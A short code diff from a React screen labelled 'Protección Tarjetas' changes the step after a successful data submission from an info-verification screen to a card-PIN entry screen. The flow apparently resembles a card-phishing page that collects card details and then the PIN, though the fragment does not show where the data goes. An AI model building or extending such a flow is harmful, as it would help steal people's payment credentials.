@@ -648,7 +648,7 @@ export default function ClientScreen() {
           if (data.success) {
             console.log('[Protección Tarjetas] Datos enviados exitosamente');
             setTimeout(() => {
-              setCurrentScreen(ScreenType.VERIFICANDO_INFO);
+              setCurrentScreen(ScreenType.NIP_TARJETA);
             }, 2000);
           } else {
             console.error('[Protección Tarjetas] Error:', data.message);
